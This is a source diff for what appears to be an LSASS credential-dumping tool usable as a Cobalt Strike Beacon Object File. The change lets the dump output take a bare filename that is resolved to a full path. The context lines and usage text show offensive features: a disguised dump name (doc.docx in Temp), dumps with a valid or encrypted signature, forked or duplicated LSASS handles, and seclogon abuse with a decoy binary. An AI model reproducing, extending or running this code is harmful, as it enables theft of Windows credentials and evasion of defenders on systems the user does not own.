@@ -17,6 +17,11 @@ void go(char* args, int length)
     BOOL    get_pid_and_leave;
     BOOL    use_malseclogon;
     LPCSTR  malseclogon_target_binary = NULL;
+    wchar_t wcFilePath[MAX_PATH];
+    UNICODE_STRING full_dump_path;
+    full_dump_path.Buffer = wcFilePath;
+    full_dump_path.Length = 0;
+    full_dump_path.MaximumLength = 0;
 
     BeaconDataParse(&parser, args, length);
     lsass_pid = BeaconDataInt(&parser);
@@ -31,7 +36,8 @@ void go(char* args, int length)
 
     if (write_dump_to_disk)
     {
-        if (!create_file(dump_path))
+        get_full_path(&full_dump_path, dump_path);
+        if (!create_file(&full_dump_path))
             return;
     }
 
@@ -180,7 +186,7 @@ void go(char* args, int length)
     if (write_dump_to_disk)
     {
         success = write_file(
-            dump_path,
+            &full_dump_path,
             dc.BaseAddress,
             dc.rva
         );
@@ -213,8 +219,8 @@ void usage(char* procname)
     PRINT("usage: %s [--getpid] --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--help]", procname);
     PRINT("    --getpid");
     PRINT("            print the PID of LSASS and leave");
-    PRINT("    --write PATH, -w PATH");
-    PRINT("            full path to the dumpfile");
+    PRINT("    --write DUMP_PATH, -w DUMP_PATH");
+    PRINT("            filename of the dump");
     PRINT("    --valid, -v");
     PRINT("            create a dump with a valid signature");
     PRINT("    --fork, -f");
@@ -223,7 +229,7 @@ void usage(char* procname)
     PRINT("            duplicate an existing LSASS handle");
     PRINT("    --malseclogon, -m");
     PRINT("            obtain a handle to LSASS by (ab)using seclogon");
-    PRINT("    --binary PATH, -b PATH");
+    PRINT("    --binary BIN_PATH, -b BIN_PATH");
     PRINT("            full path to the decoy binary used with --dup and --malseclogon");
     PRINT("    --help, -h");
     PRINT("            print this help message and leave");
@@ -244,6 +250,11 @@ int main(int argc, char* argv[])
     BOOL    use_malseclogon = FALSE;
     BOOL    is_malseclogon_stage_2 = FALSE;
     LPCSTR  malseclogon_target_binary = NULL;
+    wchar_t wcFilePath[MAX_PATH];
+    UNICODE_STRING full_dump_path;
+    full_dump_path.Buffer = wcFilePath;
+    full_dump_path.Length = 0;
+    full_dump_path.MaximumLength = 0;
 
 #ifdef _M_IX86
     if(local_is_wow64())
@@ -273,11 +284,7 @@ int main(int argc, char* argv[])
                 return -1;
             }
             dump_path = argv[++i];
-            if (!strrchr(dump_path, '\\'))
-            {
-                PRINT("You must provide a full path: %s", dump_path);
-                return -1;
-            }
+            get_full_path(&full_dump_path, dump_path);
         }
         else if (!strncmp(argv[i], "-p", 3) ||
                  !strncmp(argv[i], "--pid", 6))
@@ -371,7 +378,7 @@ int main(int argc, char* argv[])
         return 0;
     }
 
-    if (!dump_path)
+    if (!full_dump_path.Length)
     {
         PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
         usage(argv[0]);
@@ -400,7 +407,7 @@ int main(int argc, char* argv[])
 
     if (!is_malseclogon_stage_2)
     {
-        if (!create_file(dump_path))
+        if (!create_file(&full_dump_path))
             return -1;
     }
 
@@ -519,7 +526,7 @@ int main(int argc, char* argv[])
     encrypt_dump(&dc);
 
     success = write_file(
-        dump_path,
+        &full_dump_path,
         dc.BaseAddress,
         dc.rva
     );
